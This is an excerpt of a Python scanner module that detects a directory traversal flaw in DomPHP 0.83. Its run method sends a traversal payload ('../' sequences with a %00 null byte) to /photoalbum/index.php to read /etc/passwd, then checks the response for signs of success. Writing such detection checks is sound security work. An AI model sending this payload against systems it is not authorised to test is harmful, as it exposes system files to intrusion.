#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A directory traversal vulnerability in DomPHP 0."""
...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'DomPHP 0.83 - Directory Traversal Detection',
        ...
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2014', 'lfi', 'edb', 'domphp', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/photoalbum/index.php?urlancien=&url=../../../../../../../../../../../../etc/passwd%00', allow_redirects=False)
        ...
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="DomPHP 0.83 - Directory Traversal detected",
